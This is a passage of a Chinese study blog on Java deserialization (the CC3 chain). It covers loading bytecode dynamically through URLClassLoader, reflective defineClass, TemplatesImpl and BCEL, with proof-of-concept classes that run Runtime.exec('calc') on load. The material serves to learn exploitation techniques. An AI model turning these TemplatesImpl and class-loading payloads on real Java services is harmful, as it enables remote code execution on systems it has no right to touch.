oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856148.png"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856619.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC3</title>
    <link href="/2025/09/01/CC3/"/>
    <url>/2025/09/01/CC3/</url>
    
    <content type="html"><![CDATA[<p>再次深入学习动态加载字节码：</p><h1 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h1><h2 id="1、什么是Java的字节码"><a href="#1、什么是Java的字节码" class="headerlink" title="1、什么是Java的字节码"></a>1、什么是Java的字节码</h2><blockquote><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p></blockquote><p>java的核心就是跨平台运行，Java编译的结果–字节码（.class文件）交给 JVM 去运行，同时如果其他语言可以编译为字节码文件，也可以交由 JVM 运行</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703016.png"></p><h2 id="2、动态加载字节码的方法"><a href="#2、动态加载字节码的方法" class="headerlink" title="2、动态加载字节码的方法"></a>2、动态加载字节码的方法</h2><h3 id="2-1-利用-URLClassLoader-加载远程-class-文件"><a href="#2-1-利用-URLClassLoader-加载远程-class-文件" class="headerlink" title="2.1 利用 URLClassLoader 加载远程 class 文件"></a>2.1 利用 URLClassLoader 加载远程 class 文件</h3><blockquote><p>解释 URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><ul><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ul><p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。</p></blockquote><h4 id="2-1-1-file-协议"><a href="#2-1-1-file-协议" class="headerlink" title="2.1.1 file 协议"></a>2.1.1 file 协议</h4><p>先编译一个文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span>(IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703146.png"></p><p>使用 URLClassLoader 加载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoader_Calc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span>  <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///E:\\&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703834.png"></p><h4 id="2-1-2-http-协议"><a href="#2-1-2-http-协议" class="headerlink" title="2.1.2 http 协议"></a>2.1.2 http 协议</h4><p>先用python 起一个 http 服务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server <span class="hljs-number">8999</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703718.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br>    public static void main(String[] args) throws MalformedURLException, InstantiationException, IllegalAccessException, ClassNotFoundException &#123;<br>        URL[] urls = &#123;new URL(<span class="hljs-string">&quot;http://localhost:8999/&quot;</span>)&#125;;<br>        URLClassLoader classLoader = URLClassLoader.newInstance(urls);<br>        Class c = classLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-利用-ClassLoader-defineClass-直接加载字节码"><a href="#2-2-利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="2.2 利用 ClassLoader#defineClass 直接加载字节码"></a>2.2 利用 ClassLoader#defineClass 直接加载字节码</h3><blockquote><p>不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p></blockquote><p>ClassLoader#loadClass -&gt; ClassLoader#findClass -&gt; ClassLoader#defineClass</p><ul><li><code>loadClass</code> 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass</li><li><code>findClass</code> 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass</li><li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>学习如何让系统的 defineClass 来直接加载字节码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClass</span> &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        //获取 ClassLoader 的 defineClass 方法<br>        Method defineClass = ClassLoader.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-keyword">class</span>, byte[].<span class="hljs-keyword">class</span>, <span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>        defineClass.setAccessible(true);<br><br>        //将 base64 字符串解码成 <span class="hljs-keyword">class</span> <span class="hljs-title class_">文件的字节码</span><br>        byte[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        //在系统类加载器上调用 defineClass，将字节数组定义成一个 Class 对象<br>        Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        //调用无参构造<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704376.png"></p><p>跟进 <font style="color:#080808;background-color:#ffffff;">defineClass 看到它是一个 protected 属性，无法直接访问，所以上述例子中用反射调用。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704651.png"></p><h3 id="2-3-利用-TemplatesImpl-加载字节码"><a href="#2-3-利用-TemplatesImpl-加载字节码" class="headerlink" title="2.3 利用 TemplatesImpl 加载字节码"></a>2.3 利用 TemplatesImpl 加载字节码</h3><p><font style="color:#080808;background-color:#ffffff;">defineClass 方法无法直接使用，但是呢，TemplatesImpl 类中给我们提供了一个入口：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704748.png"></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl 类继承了 </font>ClassLoader ，<font style="color:#080808;background-color:#ffffff;">并重写 defineClass 方法，并且是可以被外部调用</font></p><p>现在以 <font style="color:#080808;background-color:#ffffff;">TemplatesImpl#defineClass 为终点</font>跟踪一下这条链：</p><p><font style="color:#080808;background-color:#ffffff;">查找用法：TemplatesImpl.TransletClassLoader.defineClass</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704129.png"></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">defineTransletClasses 函数还是私有的，继续找</font></p><p><font style="color:#080808;background-color:#ffffff;">这里查找 defineTransletClasses 的用法后，找到三个结果</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704550.png"></p><p><font style="color:#080808;background-color:#ffffff;">getTransletClasses 和 getTransletIndex() 都是返回了一个储存值，用于后续操作</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704137.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704963.png"></p><p>而 <font style="color:#080808;background-color:#ffffff;">getTransletInstance 中  .newInstance()  会调用无参构造创建一个实例，可以用于我们后续的代码执行所以重点跟它</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704644.png"></p><p>来到 <font style="color:#080808;background-color:#ffffff;">newTransformer 函数，它是公有的，到这里就可以了</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704704.png"></p><p><strong>小总结一下：</strong></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.TransletClassLoader.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.getTransletInstance.defineTransletClasses</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.newTransformer.getTransletInstance</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl</font></p><p><font style="color:#080808;background-color:#ffffff;">newTransformer</font></p><p><font style="color:#080808;background-color:#ffffff;">getTransletInstance</font></p><p><font style="color:#080808;background-color:#ffffff;">defineTransletClasses</font></p><p><font style="color:#080808;background-color:#ffffff;">defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TransletClassLoader.defineClass</font></p><p>接下来构造 POC：</p><p>首先满足俩个条件：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704837.png"></p><p>进入 <font style="color:#080808;background-color:#ffffff;">defineTransletClasses -&gt; newInstance</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716057.png"></p><p><font style="color:#080808;background-color:#ffffff;">前后结合一下，将 _bytecodes 构造为一维数组套二维数组：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br></code></pre></td></tr></table></figure><p>_tfactory 这个变量被标记为  <font style="color:#080808;background-color:#ffffff;">transient （不可序列化）</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705518.png"></p><p>然后在 readObject 中找：看到已经被赋值了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705580.png"></p><p>先来一个要执行的类：将其编译后放在指定位置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  &#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-comment">//这里先赋值看poc是否成功</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">执行后报错：NullPointerException</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705977.png"></p><p><font style="color:#080808;background-color:#ffffff;">调试查找哪里出了问题：</font></p><p><font style="color:#080808;background-color:#ffffff;">可以看到 _transletIndex:-1。我们需要进入到 if 语句才能正常执行</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705557.png"></p><p><font style="color:#080808;background-color:#ffffff;">所以要让执行类继承 </font><font style="color:rgb(44, 62, 80);">AbstractTranslet</font><font style="color:#080808;background-color:#ffffff;"> 类(对应：ABSTRACT_TRANSLET)，</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705525.png"></p><p><font style="color:#080808;background-color:#ffffff;">最终完整的执行类：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705801.png"></p><h3 id="2-4-利用-BCEL-ClassLoader-加载字节码"><a href="#2-4-利用-BCEL-ClassLoader-加载字节码" class="headerlink" title="2.4 利用 BCEL ClassLoader 加载字节码"></a><font style="color:#080808;background-color:#ffffff;">2.4 利用 BCEL ClassLoader 加载字节码</font></h3><blockquote><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。</p><p>关于BCEL的详细介绍：<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">《BCEL ClassLoader去哪了》</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(),<span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705534.png"></p><p><font style="color:#080808;background-color:#ffffff;">执行后可以看到有一对乱码：</font><font style="color:rgb(80, 80, 92);">BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$l$8b$I$A$A$A$A$A$A$Am$<span class="hljs-number">91</span>$c9N$c3$<span class="hljs-number">40</span>$M$<span class="hljs-number">86</span>$ffi$d3$s$N$v$85B$d9$f7$b5$e5$<span class="hljs-number">40</span>$_$dc$<span class="hljs-number">40</span>$5c$QH$<span class="hljs-number">88</span>$b0$<span class="hljs-number">88</span>$o8O$87Q$Z$II$95N$Ro$c4$<span class="hljs-number">99</span>$L$m$O$3c$A$P$<span class="hljs-number">85</span>$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$<span class="hljs-number">60</span>$NK$3e$3c$M$fb$Y$c1$a8$<span 